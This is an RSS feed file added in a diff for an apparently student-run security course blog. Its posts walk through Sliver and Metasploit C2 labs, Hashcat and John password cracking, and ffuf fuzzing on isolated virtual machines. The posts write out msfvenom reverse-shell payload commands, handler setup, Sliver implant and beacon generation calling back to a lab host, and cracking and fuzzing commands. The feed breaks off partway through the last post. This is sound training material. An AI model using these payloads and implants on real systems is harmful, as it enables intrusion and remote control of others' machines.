@@ -1,0 +1,765 @@
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+    <channel>
+        <title>Posts on tuukkaani-blog</title>
+        <link>http://localhost:1313/tuukkaani-blog/posts/</link>
+        <description>Recent content in Posts on tuukkaani-blog</description>
+        <generator>Hugo -- gohugo.io</generator>
+        <language>en-us</language>
+        <lastBuildDate>Thu, 02 Oct 2025 00:00:00 +0000</lastBuildDate>
+        <atom:link href="http://localhost:1313/tuukkaani-blog/posts/index.xml" rel="self" type="application/rss+xml" />
+        
+        <item>
+            <title>C2 with sliver and metasploit</title>
+            <link>http://localhost:1313/tuukkaani-blog/posts/h6/</link>
+            <pubDate>Thu, 02 Oct 2025 00:00:00 +0000</pubDate>
+            
+            <guid>http://localhost:1313/tuukkaani-blog/posts/h6/</guid>
+            <description>&lt;h1 id=&#34;h6&#34;&gt;H6&lt;/h1&gt;
+&lt;hr&gt;
+&lt;h3 id=&#34;a-sniffing-the-venom&#34;&gt;a) Sniffing the venom&lt;/h3&gt;
+&lt;h4 id=&#34;establishing-the-connection-and-packet-capture&#34;&gt;Establishing the connection and packet capture&lt;/h4&gt;
+&lt;p&gt;Like usual, I check to make sure the virtual machines are off the internet and communicate with each other fine. Nothing has changed in the setup so everything is working a ok.&lt;/p&gt;
+&lt;p&gt;I open up wireshark and start capturing traffic.&lt;/p&gt;
+&lt;p&gt;I am going to use the same payload I used in H5 which was as follows:
+&lt;code&gt;msfvenom -a x86 --platform linux -p linux/x86/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -e generic/none -f elf&lt;/code&gt; and remembering to open a port with &lt;code&gt;sudo ufw allow 4444/tcp&lt;/code&gt;.&lt;/p&gt;</description>
+            <content type="html"><![CDATA[<h1 id="h6">H6</h1>
+<hr>
+<h3 id="a-sniffing-the-venom">a) Sniffing the venom</h3>
+<h4 id="establishing-the-connection-and-packet-capture">Establishing the connection and packet capture</h4>
+<p>Like usual, I check to make sure the virtual machines are off the internet and communicate with each other fine. Nothing has changed in the setup so everything is working a ok.</p>
+<p>I open up wireshark and start capturing traffic.</p>
+<p>I am going to use the same payload I used in H5 which was as follows:
+<code>msfvenom -a x86 --platform linux -p linux/x86/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -e generic/none -f elf</code> and remembering to open a port with <code>sudo ufw allow 4444/tcp</code>.</p>
+<p>Then I launch <code>msfconsole</code> and set all the parameters to match the payload and start the listening session with <code>exploit</code>.</p>
+<p>To establish the connection, I go to the target machine (ms2 vm) and
+run the program.</p>
+<p><img src="img/h6/msfconsole.png" alt="Msfconsole"></p>
+<h4 id="going-through-packet-captures">Going through packet captures</h4>
+<p>Checking into wireshark and stopping the capture, I filter with
+<code>tcp.port==4444</code> as that is the port I decided to use. With that I can see the captured traffic between the host and target:</p>
+<p><img src="img/h6/wireshark_venom.png" alt="Wirkeshark msfvenom"></p>
+<p>The port 4444 here raises some alarms as it is commonly used by metasploit for reverse shell connections.</p>
+<hr>
+<h3 id="b-creating-a-http-connection-with-sliver">b) Creating a http connection with sliver</h3>
+<h4 id="sliver-installation">Sliver installation</h4>
+<p>Firstly, I&rsquo;m installing sliver on my kali machine. The sliver github provides a single liner install <code>curl https://sliver.sh/install|sudo bash</code>. Trust me bro. During the installation, I was not clearly prompted for password at first, but if it seems to be stuck for you after running the one liner, just hit enter couple times and it should prompt you. After which running <code>sliver</code> should open up the program. <a href="https://github.com/BishopFox/sliver">(Sliver Github 2025.)</a></p>
+<p><img src="img/h6/sliver.png" alt="Sliver"></p>
+<p>And it does! Ain&rsquo;t it like giga cool (ofhell).</p>
+<p>Note: it is october 2. 2025 and this is the v1.5.43 instead of the newer, but unfinished 1.6 build, so if in the future some of the functionality here is due to change.</p>
+<h4 id="establishing-connection-with-sliver">Establishing connection with sliver</h4>
+<p>So I setup wireshark in the background to capture packets. I am capturing <em>eth0</em> which is the interface I use for offline testing while <em>eth1</em> uses my actual eth to connect to the internet. This is the same setup as the previous section. Just wanted to mention it here.</p>
+<p><img src="img/h6/ipa.png" alt="Ip a"></p>
+<p>Now, I familiarize myself with sliver by going over their provided getting started tutorial, which if I remember correctly does what I want to achieve here: establishing a http connection between the host and target.</p>
+<p>So first I need to generate our implant which is the name sliver uses for malicious code run on the target machine <a href="https://sliver.sh/docs?name=Architecture">(Sliver 2025. Architecture.)</a>.</p>
+<p>I used the following command to generate the implant:
+<code>generate -b 10.10.10.10 --os linux --skip-symbols --debug</code></p>
+<p><img src="img/h6/implant.png" alt="Implant"></p>
+<p>Next I ran the implant on the target machine, which is Debian13 machine running in the same network.</p>
+<p><img src="img/h6/implant_target.png" alt="Implant at target"></p>
+<p>Using <code>sessions</code> we can see that our session has been established to the target machine:</p>
+<p><img src="img/h6/session.png" alt="Sliver session"></p>
+<p>Lastly I run <code>use</code> and select the proper implant and <code>pwd</code> to see I am actually in the target machine:</p>
+<p><img src="img/h6/target.png" alt="Target"></p>
+<p><a href="https://sliver.sh/tutorials">(Sliver 2025. Tutorials.)</a></p>
+<hr>
+<h3 id="c-sniffing-the-sliver-hihihihihihi">c) Sniffing the sliver (<em>hihihihihihi</em>)</h3>
+<p>In the very short time I had the connection, I already have quite the wall in wireshark to look at:</p>
+<p><img src="img/h6/wireshark_sliver.png" alt="Wireshark sliver"></p>
+<p>A lot of weird GET requests in fast intervals. Just the amount from a single address is quite concerning and the requests themselves don&rsquo;t help.</p>
+<hr>
+<h3 id="d-modifing-the-connection-in-sliver">d) Modifing the connection in sliver.</h3>
+<p>So it would be beneficial if we could at least limit the calling home to be less&hellip; obsessive. Luckily there is a way to do just that. In the <a href="https://sliver.sh/tutorials?name=2+-+Beacons+vs+Sessions">sliver.sh&rsquo;s beacons vs sessions tutorial</a> some of these methods are used, and that is what I am going to be doing as well.</p>
+<p>The tutorial mentions sessions being a single constantly maintained TCP connection, while beacons can call home every so often.
+<a href="https://sliver.sh/tutorials?name=2+-+Beacons+vs+Sessions">(Sliver 2025. Beacons vs Sessions.)</a></p>
+<p>So firstly we will create a new beacon with this in mind:</p>
+<p><code>generate beacon -b 10.10.10.10 --os linux -j 5 -S 15 --skip-symbols --debug --save cockball_the_movie_starring_ben_stiller</code></p>
+<p>I decided to make the executable more&hellip; <em>executable</em> by giving it an enticing name. Maybe more importantly, it was given the flags <code>-j 5</code> and <code>-S 15</code>. What I could gather from the documentation <a href="https://sliver.sh/docs?name=Getting%20Started">sliver getting started.</a>, -S stands for how often the beacon should callback in seconds. -j stands for jitter and adds a random delay in seconds to the callback. <a href="https://sliver.sh/docs?name=Getting%20Started">(Sliver 2025. Getting Started.)</a></p>
+<p>So time to test it out. I run the executable on the target machine:</p>
+<p><img src="img/h6/target2.png" alt="Target"></p>
+<p>Oh no! It seems you can&rsquo;t trust anything these days!!! Oh well. We get a callback from the beacon:</p>
+<p><img src="img/h6/beacons.png" alt="Beacons"></p>
+<p>Here we can see the last check-in and the next one. Time to check out what wireshark has in store for us!</p>
+<p><img src="img/h6/dummy.png" alt="L + n00b"></p>
+<p>Oopsie. Well I guess I&rsquo;ll have to let it run for couple of minutes.</p>
+<p><img src="img/h6/wireshark_sliver2.png" alt="Wireshark sliver 2"></p>
+<p>Now the calls are much less frequent and come at varying times.</p>
+<p><a href="https://sliver.sh/tutorials?name=2+-+Beacons+vs+Sessions">(Sliver 2025. Beacons vs Sessions.)</a></p>
+<hr>
+<h3 id="e-using-slivers-different-functionalities">e) Using sliver&rsquo;s different functionalities.</h3>
+<p>I begin by using the beacon with <code>use</code> and finishing off the name with tab:</p>
+<p><img src="img/h6/tab.png" alt="Beacon use"></p>
+<p>With <code>help</code> I can start checking out what kind of things I am able to do. Lets see if I can make the user&rsquo;s wallpaper to be a picture of Ben Stiller.</p>
+<p>So I first need to get the picture to the target machine using the command <code>upload ben.png /home/user/Pictures/ben.png</code> which uploads file ben.png from our host to the target&rsquo;s Pictures directory:</p>
+<p><img src="img/h6/ben.png" alt="Ben">
+Image can be found here: <a href="https://www.theguardian.com/film/filmblog/2015/aug/03/zoolander-2-teaser-trailer-ben-stiller">(Benjamin Lee 2015.)</a></p>
+<p>Next I need to change the Ben to be the wallpaper, I know the target uses gnome, so with a quick google I found a AskUbuntu post that gives me the command needed <a href="https://askubuntu.com/questions/66914/how-to-change-desktop-background-from-command-line-in-unity">(AskUbuntu 2011.)</a>:</p>
+<p><code>execute gsettings set org.gnome.desktop.background picture-uri file:///home/user/Pictures/ben.png</code></p>
+<p>Now, did my magnificent plan work? One could probably use sliver to take a screenshot, but found it only prints black squares on my vm, which might have something to do with displays etc. So here is a manual screenshot of the target:</p>
+<p><img src="img/h6/ohboy.png" alt="Oh boy"></p>
+<p>Now look at that! Amazing, truly!</p>
+<hr>
+<h3 id="sources">Sources</h3>
+<p>All the assignments this page is based on can be found at <a href="https://terokarvinen.com/tunkeutumistestaus/">Tero Karvinen</a></p>
+<p><a href="https://github.com/BishopFox/sliver">Sliver Github 2025.</a></p>
+<p><a href="https://sliver.sh/tutorials">Sliver 2025. Tutorials.</a></p>
+<p><a href="https://sliver.sh/docs?name=Architecture">Sliver 2025. Architecture.</a></p>
+<p><a href="https://sliver.sh/tutorials?name=2+-+Beacons+vs+Sessions">Sliver 2025. Beacons vs Sessions.</a>
+<a href="https://sliver.sh/docs?name=Getting%20Started">Sliver 2025. Getting Started.</a></p>
+<p><a href="https://www.theguardian.com/film/filmblog/2015/aug/03/zoolander-2-teaser-trailer-ben-stiller">Benjamin Lee 2015. Long catwalk home: can Ben Stiller make audiences care about Zoolander 2?</a>
+<a href="https://askubuntu.com/questions/66914/how-to-change-desktop-background-from-command-line-in-unity">AskUbuntu 2011. How to change desktop background from command line in Unity</a></p>
+]]></content>
+        </item>
+        
+        <item>
+            <title>Password cracking with Hashcat &amp; John</title>
+            <link>http://localhost:1313/tuukkaani-blog/posts/h5/</link>
+            <pubDate>Wed, 01 Oct 2025 00:00:00 +0000</pubDate>
+            
+            <guid>http://localhost:1313/tuukkaani-blog/posts/h5/</guid>
+            <description>&lt;h1 id=&#34;h5&#34;&gt;H5&lt;/h1&gt;
+&lt;hr&gt;
+&lt;h3 id=&#34;a-installing-and-testing-hashcat&#34;&gt;a) Installing and testing Hashcat&lt;/h3&gt;
+&lt;p&gt;So firstly I will install all the required programs and test it&amp;rsquo;s functionality on the following hash: &lt;em&gt;6b1628b016dff46e6fa35684be6acc96&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;It seems like hashcat is already installed on my system:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;img/h5/hashcat_help.png&#34; alt=&#34;Hashcat &amp;ndash;help&#34;&gt;&lt;/p&gt;
+&lt;p&gt;To test out the program, I&amp;rsquo;ll be following Tero&amp;rsquo;s short guide at: &lt;a href=&#34;https://terokarvinen.com/2022/cracking-passwords-with-hashcat/&#34;&gt;Cracking passwords with hashcat&lt;/a&gt;. So firstly I&amp;rsquo;m tasked to install &lt;code&gt;hashid hashcat wget&lt;/code&gt; so let&amp;rsquo;s see if I have all of those installed.&lt;/p&gt;</description>
+            <content type="html"><![CDATA[<h1 id="h5">H5</h1>
+<hr>
+<h3 id="a-installing-and-testing-hashcat">a) Installing and testing Hashcat</h3>
+<p>So firstly I will install all the required programs and test it&rsquo;s functionality on the following hash: <em>6b1628b016dff46e6fa35684be6acc96</em></p>
+<p>It seems like hashcat is already installed on my system:</p>
+<p><img src="img/h5/hashcat_help.png" alt="Hashcat &ndash;help"></p>
+<p>To test out the program, I&rsquo;ll be following Tero&rsquo;s short guide at: <a href="https://terokarvinen.com/2022/cracking-passwords-with-hashcat/">Cracking passwords with hashcat</a>. So firstly I&rsquo;m tasked to install <code>hashid hashcat wget</code> so let&rsquo;s see if I have all of those installed.</p>
+<p><img src="img/h5/guide_programs.png" alt="Installed programs"></p>
+<p>It seems everything is good to go!</p>
+<p>Next I create a new directory for testing purposes <code>mkdir hashed</code> and go into the new directory <code>cd hashed</code>. After which I&rsquo;ll be making my life a bit easier by putting the hash into a text file <code>echo &quot;6b1628b016dff46e6fa35684be6acc96&quot; &gt; hash.txt</code></p>
+<p>Now I&rsquo;m going to be using the rockyou wordlist which I get by <code>wget https://github.com/danielmiessler/SecLists/raw/master/Passwords/Leaked-Databases/rockyou.txt.tar.gz</code>.
+After the file gets on my machine, I use <code>aunpack rockyou.txt.tar.gz</code>
+but you can also use <code>tar xf rockyou.txt.tar.gz</code> to unpack the file.</p>
+<p><img src="img/h5/aunpack.png" alt="Rockyou.txt"></p>
+<p>Now, I need to identify the hash type. I could go by eyeing through some example hashes, but there are fortunately tools to make this a bit easier. This time I&rsquo;ll be using hashid.
+By doing <code>hashid -m hash.txt</code> I get the following:</p>
+<p><img src="img/h5/hash_types.png" alt="Hashid output"></p>
+<p>MD5 is quite common compared to the other two so that&rsquo;s what I&rsquo;ll be trying out first. Hashid gave me the hashcat mode which in this case is 0, I can start cracking by
+<code>hashcat -m 0 hash.txt rockyou.txt -o cracked</code></p>
+<p>I get the cracked hash in the specified output file &lsquo;cracked&rsquo; and with <code>cat cracked</code> I get the cracked hash:</p>
+<p><img src="img/h5/cracked.png" alt="Cracked hash"></p>
+<p><a href="https://terokarvinen.com/2022/cracking-passwords-with-hashcat/.">(Tero Karvinen 2022.)</a></p>
+<hr>
+<h3 id="b-installing-and-testing-john-the-ripper">b) Installing and testing John the Ripper</h3>
+<p>Like the previous section, I&rsquo;ll be going through a guide Tero has made called: <a href="https://terokarvinen.com/2023/crack-file-password-with-john/">Crack File Password With John</a>.</p>
+<p>Firstly I&rsquo;ll install the prerequisites I need with the following:
+<code>sudo apt install build-essential libssl-dev zlib1g zlib1g-dev zlib1g-gst libbz2-1.0 libbz2-dev zip</code>. I can&rsquo;t seem to find the zlib1g-gst package, so I <code>sudo apt search zlib1g</code> and don&rsquo;t seem to find the package there either. So I go check out the <a href="https://github.com/openwall/john/blob/bleeding-jumbo/doc/INSTALL-UBUNTU">john installation readme</a> and install the following:
+<code>sudo apt install build-essential libssl-dev zlib1g-dev zip libbz2-dev</code>.</p>
+<p>This time the installation completed successfully.</p>
+<p>Now I need to clone the john repository and build it. So firstly I clone the repo: <code>git clone https://github.com/openwall/john.git</code>. Next I navigate to the <em>john/src/</em> directory and run <code>./configure</code>. I check the missing libraries list and I got everything I need installed. After which I run <code>make -s clean &amp;&amp; make -sj4</code> to start compiling.</p>
+<p>I navigate to the john/run/ directory and run <code>./john</code> and everything seems to be in order:</p>
+<p><img src="img/h5/john.png" alt="John the ripper"></p>
+<p>Next I need a file to crack open, luckily Tero has a password protected zip for this purpose. To get the file I do <code>wget https://TeroKarvinen.com/2023/crack-file-password-with-john/tero.zip</code>. I&rsquo;ll try to unpack the zip file and it indeed seems to be password protected. Tero wasn&rsquo;t lying.</p>
+<p><img src="img/h5/tero_zip.png" alt="Tero.zip"></p>
+<p>So now to crack the file I need to first extract the hash from the zip file. To do so I use zip2john:
+<code>~/john/run/zip2john tero.zip &gt; tero.zip.hash</code>.</p>
+<p>After which I <code>cat</code> the output file and get the following:</p>
+<p><img src="img/h5/tero_hash.png" alt="Tero hash"></p>
+<p>Lastly I let john go at the hash and see if we get anything open:
+<code>~/john/run/john tero.zip.hash</code> and it seems we got the password.</p>
+<p><img src="img/h5/tero_pass.png" alt="Tero password"></p>
+<p>After unpacking the files and using the password <em>butterfly</em> I get the secretFiles directory with a file SECRET.md with the following contents:</p>
+<p><img src="img/h5/flag.png" alt="SECRET.md"></p>
+<p><a href="https://terokarvinen.com/2023/crack-file-password-with-john/">(Tero Karvinen 2023.)</a></p>
+<hr>
+<h3 id="c-making-a-password-protected-file-and-cracking-it">c) Making a password protected file and cracking it</h3>
+<p>I begin with creating a directory for the task <code>mkdir c</code> and navigate inside it. Then I create a another directory called <em>secret</em> and inside it I create a text file. I pack the files using <code>tar -cf secret.tar secret</code> and now due to tar not providing me with any type of encryption I googled what I could be using for this task.</p>
+<p>I came across an article by <a href="https://linuxconfig.org/how-to-create-compressed-encrypted-archives-with-tar-and-gpg">Justin Chapin</a>, in which they use gpg to encrypt a tar file&hellip; Convenient! So now I encrypt the files with <code>gpg -c secret.tar</code>. <a href="https://linuxconfig.org/how-to-create-compressed-encrypted-archives-with-tar-and-gpg">(Justin Chapin 2025.)</a>.</p>
+<p>Now that we have our target file. Let&rsquo;s crack it open by using john once more. If I try to decrypt the file I get a prompt asking for the password.</p>
+<p><img src="img/h5/gpg_pass.png" alt="gpg secret"></p>
+<p>So lets start with running:
+<code>~/john/run/gpg2john secret.tar.gpg &gt; secret.hash</code>.</p>
+<p>I <code>cat</code> the output file and see the hash:</p>
+<p><img src="img/h5/gpg_hash.png" alt="gpg hash"></p>
+<p>Lastly lets use john to crack the hash:
+<code>~/john/run/john --wordlist=wordlist.txt secret.hash</code></p>
+<p><img src="img/h5/gpg_cracked.png" alt="gpg crack"></p>
+<p>And now if I use <code>~/john/run/john --show secret.hash</code> I see the password:</p>
+<p><img src="img/h5/benstiller.png" alt="Password"></p>
+<p>And inside the newly extracted directory I find benstiller.txt:</p>
+<p><img src="img/h5/darksecret.png" alt="Dark secret"></p>
+<p>No wonder this was behind a password. Someone might steal such an amazing movie idea and make MILLIONS!!!</p>
+<hr>
+<h3 id="d-making-a-hash-for-a-text-file-and-cracking-it">d) Making a hash for a text file and cracking it</h3>
+<p>Lets make the target file. I&rsquo;ll use SHA-1 for the file <code>echo -n &quot;your secret&quot; | sha1sum &gt; secret</code>. Then I ran <code>hashid secret</code> and it failed to recognize the hash. I quickly realized I had an extra dash at the end so I quickly removed it from the file and it worked:</p>
+<p><img src="img/h5/sha1.png" alt="Sha1"></p>
+<p>Using <code>hashid -m secret</code> I get the hashcat mode for SHA-1 which is 100.
+Lastly I run <code>hashcat -m 100 secret rockyou.txt -o cracked</code> and we get what we came for:</p>
+<p><img src="img/h5/shaben.png" alt="Shaben"></p>
+<hr>
+<h3 id="e-using-msfvenom-to-create-a-reverse-shell-to-a-target-machine">e) Using msfvenom to create a reverse shell to a target machine.</h3>
+<p>For this task I&rsquo;ll be using the following setup:</p>
+<p>Target: Metasploitable2 virtual machine / 10.10.10.11</p>
+<p>Host: Kali virtual machine / 10.10.10.10</p>
+<p>I double check my virtual machines can&rsquo;t connect to internet. They are using a bridge that has no actual interfaces to use so they can only communicate with each other. On my the kali machine I open port 4444/tcp temporarily to use for testing by <code>ufw allow 4444/tcp</code>.</p>
+<p>After the setup I start with msfvenom. I found good examples from <a href="https://www.offsec.com/metasploit-unleashed/msfvenom/">OffSec</a> and made modifications to fit my needs.</p>
+<p><code>-a x86</code> to specify the target architecture.
+<code>--platform linux</code> to specify the target platform.
+<code>-p linux/x86/reverse_shell_tcp</code> to specify the payload.
+<code>LHOST=10.10.10.10</code> and <code>LPORT=4444</code> to connect to our host.
+<code>-e generic/none</code> skips encoding.
+<code>-f elf</code> to format the output as .elf. I tried other formats like python and bash but couldn&rsquo;t get them to run properly.
+<code>&gt; reverse_shell.elf</code> lastly saves the output to a file.</p>
+<p><code>msfvenom -a x86 --platform linux -p linux/x86/reverse_shell_tcp LHOST=10.10.10.10 LPORT=4444 -e generic/none -f elf &gt; reverse_shell.elf</code></p>
+<p>Then I use <code>msfconsole</code> to start a listening session <code>use exploit/multi/handler</code>. Then I set all the needed info <code>set LHOST 10.10.10.10</code>, <code>set LPORT 4444</code> and <code>set payload linux/x86/shell_reverse_tcp</code>.
+I start the session with <code>exploit</code>.</p>
+<p>After which I use ftp to login to the target and transfer the file:
+<code>ftp msfadmin@10.10.10.11</code> and <code>put reverse_shell.elf</code></p>
+<p>On the target machine, I make the file executable <code>chmod a+x reverse_shell.elf</code>. Then I run the file <code>./reverse_shell.elf</code></p>
+<p>After which we get a connection on our host machine:</p>
+<p><img src="img/h5/msfvenom.png" alt="Reverse shell"></p>
+<p>Lastly I close the opened 4444 <code>sudo ufw deny 4444/tcp</code>.</p>
+<p><a href="https://www.offsec.com/metasploit-unleashed/msfvenom/">(OffSec.)</a></p>
+<hr>
+<h3 id="x-additional-reading">x) Additional reading</h3>
+<h4 id="cracking-passwords-with-hashcat">Cracking passwords with hashcat</h4>
+<ul>
+<li>
+<p>Very straight forward and quickly gives all the necessary info on using hashcat.</p>
+</li>
+<li>
+<p>Possible addition could be instead of using a premade hash, it could instruct the user to create a md5 hash from a common password (benstiller for example). And then go on as it is currently, after which the user could be asked to check out other formats like SHA etc.</p>
+</li>
+</ul>
+<p><a href="https://terokarvinen.com/2022/cracking-passwords-with-hashcat/.">(Tero Karvinen 2022.)</a></p>
+<h4 id="crack-file-passwords-with-john">Crack file passwords with john</h4>
+<ul>
+<li>
+<p>In this section we do have a call to action at the end where we are encouraged to create and crack some files.</p>
+</li>
+<li>
+<p>Feels like an improvement over the hashcat guide.</p>
+</li>
+</ul>
+<p><a href="https://terokarvinen.com/2023/crack-file-password-with-john/">(Tero Karvinen 2023.)</a></p>
+<h3 id="sources">Sources</h3>
+<p>All the assignments this page is based on can be found at <a href="https://terokarvinen.com/tunkeutumistestaus/">Tero Karvinen</a></p>
+<p><a href="https://terokarvinen.com/2022/cracking-passwords-with-hashcat/">Tero Karvinen 2022. Cracking passwords with hashcat.</a></p>
+<p><a href="https://terokarvinen.com/2023/crack-file-password-with-john/">Tero Karvinen 2023. Crack file password with john.</a></p>
+<p><a href="https://github.com/openwall/john/blob/bleeding-jumbo/doc/INSTALL-UBUNTU">John the ripper github 2022. INSTALL-UBUNTU</a></p>
+<p><a href="https://linuxconfig.org/how-to-create-compressed-encrypted-archives-with-tar-and-gpg">Justin Chapin 2025. How to create compressed encrypted archives with tar and gpg.</a></p>
+<p><a href="https://www.offsec.com/metasploit-unleashed/msfvenom/">OffSec. MSFvenom.</a></p>
+]]></content>
+        </item>
+        
+        <item>
+            <title>Enumeration with ffuf</title>
+            <link>http://localhost:1313/tuukkaani-blog/posts/h4/</link>
+            <pubDate>Mon, 15 Sep 2025 00:00:00 +0000</pubDate>
+            
+            <guid>http://localhost:1313/tuukkaani-blog/posts/h4/</guid>
+            <description>&lt;h1 id=&#34;h4&#34;&gt;H4&lt;/h1&gt;
+&lt;hr&gt;
+&lt;h3 id=&#34;a-dirfuz-1&#34;&gt;a) Dirfuz-1&lt;/h3&gt;
+&lt;p&gt;I got the target binary from &lt;a href=&#34;https://terokarvinen.com/2024/fuzz-urls-find-hidden-directories/&#34;&gt;(Tero Karvinen Find Hidden Web Directories - Fuzz URLs with ffuf.)&lt;/a&gt; and &lt;code&gt;chmod u+x dirfuzt-1&lt;/code&gt; to make it runnable. I also got the seclists by &lt;code&gt;sudo apt install seclists&lt;/code&gt;. After which I disconnected
+my virtual machine from the internet. We are tasked to find two URLs: Admin page and a Version Control related page.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;img/h4/challenge.png&#34; alt=&#34;Challenge&#34;&gt;&lt;/p&gt;
+&lt;p&gt;After running the random binary &lt;code&gt;./dirfuzt-1&lt;/code&gt; I found on the internet and whose creator told me to do so, I got the front page up.&lt;/p&gt;</description>
+            <content type="html"><![CDATA[<h1 id="h4">H4</h1>
+<hr>
+<h3 id="a-dirfuz-1">a) Dirfuz-1</h3>
+<p>I got the target binary from <a href="https://terokarvinen.com/2024/fuzz-urls-find-hidden-directories/">(Tero Karvinen Find Hidden Web Directories - Fuzz URLs with ffuf.)</a> and <code>chmod u+x dirfuzt-1</code> to make it runnable. I also got the seclists by <code>sudo apt install seclists</code>. After which I disconnected
+my virtual machine from the internet. We are tasked to find two URLs: Admin page and a Version Control related page.</p>
+<p><img src="img/h4/challenge.png" alt="Challenge"></p>
+<p>After running the random binary <code>./dirfuzt-1</code> I found on the internet and whose creator told me to do so, I got the front page up.</p>
+<p><img src="img/h4/dirfuzt.png" alt="Trust me bro"></p>
+<p>My first though was to just try running ffuf as follows: <code>ffuf -u http://127.0.0.2:8000/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 200</code>. After doing so I got a huge list of pages with similar stats.</p>
+<p><img src="img/h4/fuff.png" alt="Ffuf results"></p>
+<p>And if we go to one of these pages, for example /zips, we can see it is the same as the index page.</p>
+<p><img src="img/h4/zips.png" alt="Nothing, again"></p>
+<p>Now I assume most of the pages that returned with 200 are the same page, so I need to do some additional filtering.
+I decide to filter by word count. In the <a href="https://manpages.debian.org/testing/ffuf/ffuf.1.en.html">Ffuf man pages</a> I found flag for filtering by word count. I ran the previous command again now with the new additional <code>-fw 9</code> flag and got the following results.</p>
+<p><img src="img/h4/newffuf.png" alt="Filtered results"></p>
+<p>It seems ffuf found pages that related to the task at hand, going to the /wp-admin page gives us our first flag.</p>
+<p><img src="img/h4/firstflag.png" alt="First flag"></p>
+<p>The second flag can be found on any of the /.git pages.</p>
+<p><img src="img/h4/secondflag.png" alt="Second flag"></p>
+<p>And so the challenge is done. In the end we found the flags by running the following command <code>ffuf -u http://127.0.0.2:8000/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 200 -fw 9</code>. So in short, we dug through the target URL for
+using <code>-w /your/wordlist/here</code> wordlist, <code>-mc 200</code> to match all pages that return with status 200 and lastly <code>-fw 9</code> filter out pages with the word count of 9. Once again, all of this can be found from ffuf&rsquo;s man pages. <a href="https://manpages.debian.org/testing/ffuf/ffuf.1.en.html">(Fuff man page.)</a></p>
+<hr>
+<h3 id="b-fuffme">b) Fuffme</h3>
+<p>For this section, I&rsquo;ll be following the instructions found at <a href="https://terokarvinen.com/2023/fuffme-web-fuzzing-target-debian/">(Tero Karvinen Fuffme).</a>
+I installed the missing dependencies, in this case docker <code>sudo apt install docker.io</code>. After which I followed the
+rest of the guide and got the container running successfully.</p>
+<p><img src="img/h4/ffufme.png" alt="Fuffme curl"></p>
+<p>Next I got the wordlists that were listed in the instructions, disconnected the vm and then I was ready to start doing the
+practice exercises.</p>
+<hr>
+<h3 id="c-basic-content-discovery">c) Basic Content Discovery</h3>
+<p>So the first I needed to do the following:</p>
+<p><img src="img/h4/basic.png" alt="Basic fuzz"></p>
+<p>And it seems everything is in working order:</p>
+<p><img src="img/h4/basicffuf.png" alt="Ffuf output"></p>
+<hr>
+<h3 id="d-content-discovery-with-recursion">d) Content Discovery With Recursion</h3>
+<p>Again the task goes as follows:</p>
+<p><img src="img/h4/recursion.png" alt="Recursion task"></p>
+<p>After doing the task, I didn&rsquo;t really like that fact that the output
+doesn&rsquo;t show the full URL, but instead lists just the matched word. I did some digging and found a pull request where such flag
+was to be added, but joohoi seems to avoid <em>bloat</em> so an alternative solution was given by piping to grep <a href="https://github.com/ffuf/ffuf/pull/490">(Ffuf pull request.)</a>. In the end this is the command I ran <code>ffuf -u http://localhost/cd/recursion/FUZZ -w /usr/share/wordlists/common.txt -recursion -v 2&gt;/dev/null | grep -oE 'http[^ ]*'</code>.</p>
+<p><img src="img/h4/recursionffuf.png" alt="Recursion ffuf"></p>
+<hr>
+<h3 id="e-content-discovery-with-file-extensions">e) Content Discovery With File Extensions</h3>
+<p>The task:</p>
+<p><img src="img/h4/fileextension.png" alt="File Extensions"></p>
+<p>Results by using <code>ffuf -u http://localhost/cd/ext/logs/FUZZ -w common.txt -e .log</code>:</p>
+<p><img src="img/h4/extffuf.png" alt="Ffuf results"></p>
+<hr>
+<h3 id="f-no-404-status">f) No 404 status</h3>
+<p>The task:</p>
+<p><img src="img/h4/404.png" alt="no404"></p>
+<p>Results by using <code>ffuf -u http://localhost/cd/no404/FUZZ -w common.txt -fs 669</code>:</p>
+<p><img src="img/h4/404ffuf.png" alt="Ffuf results"></p>
+<hr>
+<h3 id="g-param-mining">g) Param mining</h3>
+<p>The task:</p>
+<p><img src="img/h4/mining.png" alt="Param Mining"></p>
+<p>Results by using <code>ffuf -u http://localhost/cd/param/data?FUZZ=1 -w common.txt</code>:</p>
+<p><img src="img/h4/miningffuf.png" alt="Ffuf results"></p>
+<hr>
+<h3 id="h-rate-limited">h) Rate Limited</h3>
+<p>So the following task is:</p>
+<p><img src="img/h4/rate.png" alt="Rate Limited"></p>
+<p>We are told that the our requests have a 50 requests/second limit.
+So we first <code>ffuf -u http://localhost/cd/rate/FUZZ -w /usr/share/wordlists/common.txt -mc 200,429</code>:</p>
+<p><img src="img/h4/ratefirst.png" alt="Ffuf hitting the limits"></p>
+<p>Here we see a bunch of status 429s. This is due to us hitting the limit and getting our driver&rsquo;s license revoked for a couple of seconds. We repeat what we just did, but this time abide by the rate limits to avoid any issues <code>ffuf -u http://localhost/cd/rate/FUZZ -w /usr/share/wordlists/common.txt -t 5 -p 0.1 -mc 200,429</code>:</p>
+<p><img src="img/h4/ratesecond.png" alt="Ffuf but slower"></p>
+<p>Now we got the file we were after, the process also notably took longer to finish.</p>
+<hr>
+<h3 id="i-subdomains---virtual-host-enumeration">i) Subdomains - Virtual host Enumeration</h3>
+<p>Task at hand:</p>
+<p><img src="img/h4/subdomain.png" alt="Subdomains"></p>
+<p>We can enumerate the subdomains by using the Host header with ffuf on virtual hosts.
+Results by using <code>ffuf -u http://localhost -H &quot;Host: FUZZ.ffuf.me&quot; -w subdomains.txt -fs 1495</code>:</p>
+<p><img src="img/h4/subdomainffuf.png" alt="Subdomains ffuf"></p>
+<hr>
+<h3 id="x-additional-reading">x) Additional reading</h3>
+<h4 id="fuzz-urls-with-ffuf">Fuzz URLs with ffuf</h4>
+<p>The page goes over what ffuf is and what it is used for.
+After which we are guided through a process of installing sample targets
+and all the required tools and dictionaries for attacking the sample targets.
+Lastly you can find some use case examples with useful flags that will be used when
+testing against the given targets. <a href="https://terokarvinen.com/2024/fuzz-urls-find-hidden-directories/">(Tero Karvinen Find Hidden Web Directories - Fuzz URLs with ffuf).</a></p>
+<h4 id="ffuf-readme">Ffuf readme</h4>
+<p>The readme page goes over, well, the usage of ffuf including installation, use cases,
